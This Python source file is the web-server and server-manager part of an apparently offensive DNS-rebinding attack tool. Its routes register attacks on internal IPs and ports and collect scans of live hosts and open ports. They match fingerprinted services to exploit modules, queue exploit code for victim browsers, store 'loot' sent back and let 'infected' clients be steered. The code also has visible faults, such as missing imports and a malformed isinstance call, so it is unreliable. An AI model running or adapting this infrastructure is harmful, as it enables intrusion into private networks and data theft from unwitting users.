#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


import time
import logging
from multiprocessing import Process
import json
import threading

import sanic
from sanic import Sanic
from sanic.exceptions import ServerError
from sanic_cors import CORS, cross_origin
from urllib.parse import urlencode

from lib import network
from lib import ipc
from lib import misc
from lib.constants import *

logger = logging.getLogger(__name__)


class Webserver:
    def __init__(self):
        self.app = None     # Sanic app

        self.cors = None    # CORS config for Sanic

        self.config = {}    # Config-values in ini-file

        # To cleanup web servers we keep track
        self.last_access = 0

    def run(self, sock, port):
        logger.info("Starting web server on port {}".format(port))
        last_access = time.time()

        self.port = port

        response = ipc.sync_http_raw("GET", SOCK_CONFIG, "/get/section/Scan")
        ipc.assert_response_valid(response, dict)
        self.config = response["text"]
        self.set_default_options()

        # Get all static files to serve
        response = ipc.sync_http_raw("GET", SOCK_CONFIG, "/get/section/Webserver")
        ipc.assert_response_valid(response, dict)
        assert "static" in response["text"]
        self.config["files2serve"] = []
        for entry in response["text"]["static"].split(";"):
            try:
                webname, path = entry.split(":")
                self.config["files2serve"].append( (webname, path) )
            except:
                logger.critical("Entry: '{}' in config file is invalid".format(entry))
                sys.exit(1)

#        assert "client_managed" in response["text"]
        self.client_managed = response["text"].get("client_managed", False)

        assert "interface" in response["text"]
        self.config["interface"] = response["text"]["interface"]

        self.config["debug_mode"] = response["text"].get("debug_mode", False)

        self.app = Sanic("Webserver")
        self.cors = CORS(
            self.app,
            automatic_options=True,
            resources={r"/*": {"origins": "*"}}
        )

        self.add_routes()
        logger.info("Started web server on port {}".format(port))
        self.app.run(sock=sock, access_log=False)

    def add_routes(self):
        self.app.add_route(self.stop, "/exit", methods=["POST"])
        self.app.add_route(self.status, "/status", methods=["GET"])
        self.app.add_route(self.get_access, "/get/access", methods=["GET"])
        self.app.add_route(self.dns_change, "/dns/change/<ip_addr>", methods=["POST"])
        self.app.add_route(self.get_200, "/200", methods=["GET"])
        self.app.add_route(self.redirect_attack, "/redirect/attack/<localip>/<port:int>", methods=["GET"])
        self.app.add_route(self.register_attack, "/register/attack/<localip>/<port:int>", methods=["POST"])
        self.app.add_route(self.redirect_rebind, "/redirect/rebind", methods=["GET"])
        self.app.add_route(self.register_rebind, "/register/rebind", methods=["POST"])
        self.app.add_route(
            self.client_exist,
            "/client/exist/<client:[a-zA-Z0-9]+>",
            methods=["GET"]
        )
        self.app.add_route(
            self.client_connected,
            "/client/connected/<client:[a-zA-Z0-9]+>",
            methods=["GET"]
        )

        for serve in self.config["files2serve"]:
            self.app.static(serve[0], serve[1])

        self.app.add_route(
            self.service_detection,
            "/service/detection/<rhost>/<localip>/<localport:int>",
            methods=["POST"]
        )

        self.app.add_route(self.store_loot, "/store/loot/<host>", methods=["POST"])
        self.app.add_route(self.hosts_up, "/hosts/up", methods=["POST"])
        self.app.add_route(self.ports_open, "/ports/open/<localip>", methods=["POST"])
        self.app.add_route(self.new_commands, "/new/commands/<hostname>", methods=["GET"])

        self.app.add_route(self.common_ports, "/common/ports", methods=["GET"])
        self.app.add_route(self.common_ips, "/common/ips", methods=["GET"])
        self.app.add_route(self.generate_exploit, "/exploit/generate/<exploitid>", methods=["GET"])
        self.app.add_route(
            self.module_finished,
            "/module/finished/<host>/<modid>/<result>",
            methods=["POST"]
        )

        # These APIs are used in the demo version to allow the client control other clients it has
        # "infected".
        if self.client_managed:
            self.app.add_route(self.client_delete, "/client/delete/<clientid>", methods=["POST"])
            self.app.add_route(
                self.client_payloads,
                "/client/payloads/<exploitid>",
                methods=["GET"]
            )
            self.app.add_route(
                self.client_product,
                "/client/product/<clientid>",
                methods=["GET"]
            )
            self.app.add_route(self.client_available_modules, "/client/modules/<clientid>", methods=["GET"])
            self.app.add_route(
                self.client_exploit,
                "/client/exploit/<clientid>/<modid>/<payid>",
                methods=["GET"]
            )

            self.app.add_route(self.client_childs, "/client/childs", methods=["GET"])
            self.app.add_route(
                self.client_options,
                "/client/options/<exploitid>/<payloadid>",
                methods=["GET"]
            )

    def set_default_options(self):
        default = [
            ("local_ip_subnet", False),
            ("common_ips", "192.168.0.1,192.168.1.1,192.168.2.1,192.168.56.1,10.0.0.1,172.16.0.1")
        ]
        for d in default:
            key, val = d
            if key not in self.config:
                self.config[key] = val

    def host2clientid(self, request):
        try:
            host = request.headers["Host"]
        except:
            raise ServerError("Host-header was not present")

        # This check is not foolproof, but it only need to be good enough to catch errors in test
        # environment
        assert len(host.split(".")) > 2
        clientid = misc.hostname2id(host)
        assert clientid != "www"
        return clientid


    async def module_finished(self, _request, host, modid, result):
        clientid = misc.hostname2id(host)
        response = await ipc.async_http_raw(
            "POST",
            SOCK_MODULES,
            "/exploit/finished/{}/{}".format(clientid, modid)
        )
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/append/value/{}/{}/{}".format(clientid, result, modid)
        )
        return sanic.response.json(RETURN_OK)

    async def client_options(self, _request, exploitid, payloadid):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_MODULES,
            "/exploit/payload/options/{}/{}".format(exploitid, payloadid)
        )
        return sanic.response.json(response["text"])

    async def client_payloads(self, _request, exploitid):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_MODULES,
            "/exploit/payloads/{}".format(exploitid)
        )
        if isinstance(response, dict) and isinstance(response.get("text"), list):
            return sanic.response.json(response["text"])
        raise ServerError("Unknown error", status_code=500)

    async def client_childs(self, request):
        """
        Get all childs of current client along with some other key data.

        Format is: [{"id":"clientid", "ip":"127.0.0.1", "port":"8080"}]
        """
        clientid = self.host2clientid(request)
        response = await ipc.async_http_raw(
            "GET",
            SOCK_DATABASE,
            "/get/json/{}/childs".format(clientid)
        )
        if isinstance(response, dict) and isinstance(response.get("text"), list):
            ret = []
            clients = response.get("text")
            for client in clients:
                ins = {"id": client}
                for key in ["ip", "port"]:
                    resp1 = await ipc.async_http_raw(
                        "GET",
                        SOCK_DATABASE,
                        "/get/value/{}/{}".format(client, key)
                    )
                    if isinstance(response) and isinstance(response.get("text"), dict):
                        ins[key] = response["text"].get(key, "")
                ret.append(ins)
            return sanic.response.json(ret)
        raise ServerError("Unknown error", status_code=500)

    async def generate_exploit(self, request, exploitid):
        # This is only allowed from localhost
        if request.ip != "127.0.0.1" or self.config["debug_mode"] is True:
            raise ServerError("Forbidden", status_code=401)

        response = await ipc.async_http_raw(
            "GET",
            SOCK_MODULES,
            "/exploit/code/{}?{}".format(exploitid, urlencode(request.raw_args))
        )
        if isinstance(response, dict) and "text" in response:
            return sanic.response.raw(response["text"].encode())
        raise ServerError("Unknown error", status_code=500)

    async def store_loot(self, request, host):
        clientid = misc.hostname2id(host)
        data = request.json
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/merge/json/{}/loot".format(clientid),
            json.dumps(data)
        )
        if isinstance(response, dict) and "text" in response:
            return sanic.response.json(response["text"])
        raise ServerError("Unknown error", status_code=500)

    async def client_delete(self, _request, client):
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/delete/client/{}".format(client)
        )
        if isinstance(response, dict) and "text" in response:
            return sanic.response.json(response["text"])
        raise ServerError("Unknown error", status_code=500)

    async def client_product(self, _request, clientid):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_DATABASE,
            "/get/json/{}/product".format(clientid)
        )
        if response["status"] == 200 and isinstance(response, dict) and "text" in response:
            return sanic.response.json(response["text"])
        raise ServerError("Product not found", status_code=500)

    async def client_available_modules(self, _request, clientid):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_DATABASE,
            "/get/json/{}/matched_modules".format(clientid)
        )
        if isinstance(response, dict) and "text" in response:
            return sanic.response.json(response["text"])
        raise ServerError("Unknown error", status_code=500)

    async def client_exploit(self, request, clientid, modid, payid):
        args = request.raw_args
        response = await ipc.async_http_raw(
            "GET",
            SOCK_MODULES,
            "/exploit/code/{}/{}?{}".format(modid, payid, urlencode(args))
        )
        # Unsure, if it will return bytes or str
        if isinstance(response, dict) and response["status"] == 200:
            _tmp = await self.store_exploit(clientid, response["text"])
        else:
            raise ServerError("Unknown error", status_code=500)
        return sanic.response.json(RETURN_OK)

    async def common_ports(self, _request):
        response = await ipc.async_http_raw("GET", SOCK_MODULES, "/ports/list")
        if isinstance(response, dict) and isinstance(response.get("text"), list):
            return sanic.response.json(response["text"])
        return sanic.response.json(RETURN_ERROR)

    async def common_ips(self, _request):
        return sanic.response.json(self.config["common_ips"].split(","))

    async def new_commands(self, request, hostname):
        clientid = misc.hostname2id(hostname)
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/pop/value/{}/exploit_queue".format(clientid)
        )
        # TODO: Gå gjennom all error-checkers, response.get("text", dict) makes no sense
        if isinstance(response, dict) and response["status"] == 200:
            return sanic.response.raw(response["text"].encode())
        return sanic.response.raw(b"")

    async def hosts_up(self, request):
        clientid = self.host2clientid(request)

        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/append/list/{}/ipsalive".format(clientid),
            request.body
        )
        if isinstance(response, dict) and isinstance(response.get("text"), dict):
            return sanic.response.json(response["text"])
        return sanic.response.json(RETURN_ERROR)

    async def ports_open(self, request, localip):
        clientid = self.host2clientid(request)
        try:
            payload = json.loads(request.body.decode("utf-8"))
        except:
            raise ServerError("POST body is not valid", 500)

        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/append/list/{}/open_{}".format(clientid, localip),
            request.body
        )
        if isinstance(response, dict) and isinstance(response.get("text"), dict):
            return sanic.response.json(response["text"])
        return sanic.response.json(RETURN_ERROR)

    async def store_exploit(self, clientid, exploit):
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/append/body/{}/exploit_queue".format(clientid),
            exploit
        )
        if isinstance(response, dict) and isinstance(response.get("text"), dict):
            return True
        return False

    async def service_detection(self, request, rhost, localip, localport):
        home = request.headers["Host"]
        clientid = misc.hostname2id(rhost)

        # Store raw response
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/store/body/{}/httpresponse".format(clientid),
            request.body
        )
        assert isinstance(response, dict) and isinstance(response["text"], dict)

        response = await ipc.async_http_raw(
            "POST",
            SOCK_SD,
            "/match",
            request.body
        )
        if isinstance(response, dict) and isinstance(response.get("text"), list):
            matches = response["text"]
            # Store matched signatures
            tmp = await ipc.async_http_raw(
                "POST",
                SOCK_DATABASE,
                "/store/json/{}/product".format(clientid),
                json.dumps(matches)
            )
            for match in matches:
                response = await ipc.async_http_raw(
                    "GET",
                    SOCK_MODULES,
                    "/search/exploits/product?" + urlencode(match)
                )
                if isinstance(response, dict) and isinstance(response.get("text"), list):
                    exploits = response["text"]
                    tmp = await ipc.async_http_raw(
                        "POST",
                        SOCK_DATABASE,
                        "/append/list/{}/matched_modules".format(clientid),
                        json.dumps(exploits)
                    )
                    tmp = await ipc.async_http_raw(
                        "GET",
                        SOCK_DATABASE,
                        "/get/json/{}/loot".format(clientid)
                    )
                    if tmp["status"] == 200:
                        args = tmp.get("text", {})
                    else:
                        args = {}
                    args["HOME"] = home
                    for exploit in exploits:
                        response = await ipc.async_http_raw(
                            "GET",
                            SOCK_MODULES,
                            "/exploit/code/{}?{}".format(exploit, urlencode(args))
                        )
                        if isinstance(response, dict):
                            await self.store_exploit(clientid, response["text"])
                        else:
                            raise ServerError("String is not returned", status_code=500)
            return sanic.response.json(response["text"])
        return sanic.response.json(RETURN_ERROR)

    async def client_connected(self, request, client):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_DATABASE,
            "/get/value/{}/connected".format(client)
        )
        if response["status"] == 200:
            return sanic.response.json(response["text"])
        raise ServerError("Not found", status_code=404)

    async def client_exist(self, request, client):
        response = await ipc.async_http_raw(
            "GET",
            SOCK_DATABASE,
            "/client/exist/{}".format(client)
        )
        if response["status"] == 200:
            return sanic.response.json(response["text"])
        raise ServerError("Not found", status_code=404)

    async def get_access(self, request):
        return sanic.response.json({"access":self.last_access})

    async def dns_change(self, request, ip_addr):
        last_access = time.time()
        host = request.host.split(":")[0]
        clientid = misc.hostname2id(host)

        # Notify that this host has connected
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/store/value/{}/connected/true".format(clientid)
        )

        if network.internal_ip(ip_addr) is False:
            return sanic.response.json(RETURN_ERROR)

        # Get browser and act accordingly
        browser = request.raw_args.get("browser", "Unknown")
        await self.store_browser(browser, clientid)

        # For MS-browsers we must block the client from accessing the port
        if browser == "IE" or browser == "Edge":
            assert network.validIPv4(request.ip)
            delete = IPTABLES_INSERT.format("-D INPUT", request.ip, self.config["interface"], self.port)
            insert = IPTABLES_INSERT.format("-I INPUT 1", request.ip, self.config["interface"], self.port)
            logger.info("Running command: {}".format(insert))
            os.system(insert)   # Create rule

            # Get timeout count
            try:
                timeout = int(request.raw_args.get("timer", "30"))
            except:
                timeout = 30

            # Create timer to delete rule
            # TODO: 30 seconds is not optimal, client could also report when done
            logger.info("Creating timer to run command: {}".format(delete))
            call = threading.Timer(timeout, os.system, (delete, ) )
            call.start()
        else:
            response = await ipc.async_http_raw(
                "POST",
                SOCK_DNS,
                "/add/dynamic/{}/{}".format(host, ip_addr)
            )
            if isinstance(response, dict) and isinstance(response.get("text"), dict):
                return sanic.response.json(response["text"])
        return sanic.response.json(RETURN_ERROR)

    async def status(self, _request):
        return sanic.response.json(RETURN_UP)

    async def stop(self, request):
        if request.ip != "127.0.0.1" or self.config["debug_mode"] is True:
            raise ServerError("Forbidden", status_code=401)
        else:
            self.app.stop()
            return sanic.response.json(RETURN_STOPPED)

    async def get_200(self, request):
        last_access = time.time()
        echo = request.raw_args.get("echo", "OK")
        return sanic.response.text(echo)

    async def rebind(self, hostname, ip):
        response = await ipc.async_http_raw(
            "POST",
            SOCK_WEBSERVER,
            "/new/client/{}/{}".format(ip, hostname)
        )
        if isinstance(response, dict) is False or "text" not in response:
            raise ServerError("Something bad happened", 500)
        resp = response["text"]
        if isinstance(resp, dict) is False or "redirect" not in resp:
            raise ServerError("Something bad happened", 500)

        # Register the new client
        newid = resp["domain"].split(".")[0]
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/new/client/{}".format(newid)
        )
        return {"redirect":resp["redirect"]}


    async def register_rebind(self, request):
        last_access = time.time()
        hostname = request.host.split(":")[0]
        resp = await self.rebind(hostname, request.ip)
        return sanic.response.json({"redirect":resp["redirect"]})

    async def redirect_rebind(self, request):
        last_access = time.time()
        hostname = request.host.split(":")[0]
        resp = await self.rebind(hostname, request.ip)
        return sanic.response.redirect(resp["redirect"])

    async def store_browser(self, browser, clientid):
        if browser != "Unknown":
            response = await ipc.async_http_raw(
                "POST",
                SOCK_DATABASE,
                "/store/value/{}/browser/{}".format(clientid, browser)
            )
            if isinstance(response, dict) is False or "text" not in response:
                return None
            return response["text"]
        return None

    async def attack(self, hostname, ip, localip, port, args):
        response = await ipc.async_http_raw(
            "POST",
            SOCK_WEBSERVER,
            "/new/attack/{}/{}/{}/{}".format(ip, localip, port, hostname)
        )
        if isinstance(response, dict) is False or "text" not in response:
            raise ServerError("Something bad happened", 500)
        resp = response["text"]
        if isinstance(resp, dict) is False or "redirect" not in resp:
            raise ServerError("Something bad happened", 500)

        browser = args.get("browser", "Unknown")
        if browser == "IE" or browser == "Edge":
            response = await ipc.async_http_raw(
                "POST",
                SOCK_DNS,
                "/add/dynamic/ms/{}/{}".format(resp["domain"], localip)
            )

        clientid = misc.hostname2id(hostname)
        childid = misc.hostname2id(resp["domain"])
        response = await ipc.async_http_raw(
            "POST",
            SOCK_DATABASE,
            "/new/attack/value/{}/{}/{}/{}".format(clientid, childid, localip, port)
        )

        # Store which browser is used
        await self.store_browser(browser, clientid)

        return {"redirect":resp["redirect"]}

    async def register_attack(self, request, localip, port):
        last_access = time.time()
        hostname = request.host.split(":")[0]
        resp = await self.attack(hostname, request.ip, localip, port, request.raw_args)
        return sanic.response.json({"redirect":resp["redirect"]})

    async def redirect_attack(self, request, localip, port):
        last_access = time.time()
        hostname = request.host.split(":")[0]
        resp = await self.attack(hostname, request.ip, localip, port, request.raw_args)
        return sanic.response.redirect(resp["redirect"])


class ManageWebservers:
    def __init__(self):
        # Main public web server that must be running
        self.main_server = {}

        # List of other public web servers that are running
        self.webservers = []

        self.app = None     # Sanic
        self.socket = None  # Socket for the web server

        self.config = {}

    def run(self):
        self.refresh_config()

        self.socket = ipc.unix_socket(SOCKET_WEBSERVER)
        ip_addr = self.config["bind"]
        port = int(self.config["port"])
        webserver, proc, socket = self._start_webserver(ip_addr, port)
        self.main_server = {
            "proc": proc,
            "socket": socket,
            "webserver": webserver,
            "ip": ip_addr,
            "port": port
        }

        self.app = Sanic("ManageWebservers")
        self.add_routes()
        logger.info("Initializing management webserver")
        self.app.run(sock=self.socket, access_log=False)

    def add_routes(self):
        self.app.add_route(self.exit, "/exit", methods=["POST"])
        self.app.add_route(self.status, "/status", methods=["GET"])
        self.app.add_route(self.stop_webserver, "/stop/<port:int>", methods=["POST"])
        self.app.add_route(
            self.register_attack,
            "/new/attack/<publicip>/<localip>/<port:int>/<hostname>",
            methods=["POST"]
        )
        self.app.add_route(self.register_client, "/new/client/<publicip>/<hostname>", methods=["POST"])

    def servers_cleanup(self, inactivity=5):
        """
        Terminate web servers that has been inactive for a given amount of time.
        """
        curr_time = time.time()
        dels = []
        for i in range(0, len(self.webservers)):
            port = self.webservers[i].get("port", None)
            assert(port != None)
            resp = ipc.sync_http_raw(
                "GET",
                "http://127.0.0.1:{}".format(port),
                "/get/access"
            )
            if isinstance(resp, dict) is True and "access" in resp.get("text", {}):
                try:
                    old_time = float(resp["text"]["access"])
                except:
                    old_time = 0.0
                if int(old_time) != 0 and (curr_time - old_time) > (60*inactivity):
                    self._stop_webserver(self.webservers[i])
                    dels.append(i)

        for i in dels:
            del self.webservers[i]

    def refresh_config(self):
        response = ipc.sync_http_raw("GET", SOCK_CONFIG, "/get/variable/DNSAPI/root")
        ipc.assert_response_valid(response, dict)
        assert "root" in response["text"]
        root = response["text"]["root"]
        roots = root.split(",")

        response = ipc.sync_http_raw("GET", SOCK_CONFIG, "/get/section/ManageWebserver")
        ipc.assert_response_valid(response, dict)
        self.config = response["text"].copy()
        self.config["roots"] = roots
        assert isinstance(self.config, dict) and \
            "port" in self.config and \
            "bind" in self.config and \
            "redirect_initial" in self.config and \
            "redirect_attack" in self.config

    def _webserver_running(self, port):
        if self.main_server["port"] == port:
            return True

        for webserver in self.webservers:
            if webserver["port"] == port:
                return True

        return False

    def _stop_webserver(self, webserver):
        ipc.sync_http_raw(
            "POST",
            "http://localhost:{}".format(webserver["port"]),
            "/exit"
        )
        webserver["proc"].join()
        webserver["socket"].close()

    def _start_webserver(self, ip_addr, port):
        webserver = Webserver()
        socket = network.create_socket(ip_addr, port)
        proc = Process(target=webserver.run, args=(socket, port, ))
        proc.start()
        return (webserver, proc, socket)

    def hostname2root(self, hostname):
        for root in self.config["roots"]:
            if hostname.endswith(root):
                return root
        return None

    async def register_attack(self, _request, publicip, localip, port, hostname):
        # TODO: Any time a new attack is registered, we also try and terminate old services
#        self.servers_cleanup()

        root = self.hostname2root(hostname)
        if root is None:
            raise ServerError("Hostname is not valid", 500)

        # If no webserver is running on the port, we ned to start a new one
        if self._webserver_running(port) is False:
            logger.info("Starting new web server at port {}".format(port))
            web, proc, socket = self._start_webserver("0.0.0.0", port)
            self.webservers.append({"proc": proc, "socket": socket, "webserver": web, "port": port})

        newid = misc.random_id()
        redir = "http://{}.{}:{}{}#ip={}&port={}&server={}".format(
            newid, root, port, self.config["redirect_attack"], localip, port, hostname
        )
        return sanic.response.json({"redirect": redir, "domain": "{}.{}".format(newid, root)})

    async def register_client(self, _request, publicip, hostname):
        root = self.hostname2root(hostname)
        if root is None:
            raise ServerError("Hostname is not valid", 500)

        newid = misc.random_id()
        port = self.main_server["port"]
        redir = "http://{}.{}:{}{}".format(newid, root, port, self.config["redirect_initial"])
        return sanic.response.json({"redirect": redir, "domain": "{}.{}".format(newid, root)})

    async def stop_webserver(self, _request, port):
        # Find the correct port and call self.webservers[i].stop() (I think)
        for i in range(0, len(self.webservers)):
            if self.webservers[i]["port"] == port:
                self._stop_webserver(self.webservers[i])
                del self.webservers[i]
                return sanic.response.json({"response": "stopped"})
        return sanic.response.json({"response": "not found"})

    async def exit(self, _request):
        for i in range(0, len(self.webservers)):
            self._stop_webserver(self.webservers[i])
            del self.webservers[i]
        self._stop_webserver(self.main_server)
        self.app.stop()
        self.socket.close()
        return sanic.response.json(RETURN_STOPPED)

    async def status(self, _request):
        port = self.main_server.get("port", 80)

        resp = ipc.sync_http_raw("GET", "http://127.0.0.1:{}".format(port), "/status")
        if isinstance(resp, dict) is True and resp.get("text", {}).get("status") == "up":
            return sanic.response.json(RETURN_UP)
        return sanic.response.json({"status": "down"})
